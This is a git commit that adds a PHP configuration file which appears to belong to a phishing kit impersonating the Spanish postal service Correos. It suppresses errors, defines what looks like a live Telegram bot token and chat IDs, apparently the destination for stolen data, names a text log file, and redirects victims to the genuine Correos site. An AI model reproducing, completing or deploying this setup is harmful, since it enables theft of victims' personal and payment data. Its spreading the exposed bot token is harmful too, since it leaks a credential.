b0381652c502c57ef5e01dd7cae66fdf05aa4378
lokassora <108151560+lokasmarsa@users.noreply.github.com>
2023-01-10 03:11:03 +0100

    d

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ");
+define("TELEGRAM_CHAT_ID", "-889684849");
+define("TELEGRAM_CHAT_IDD", "-889684849");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
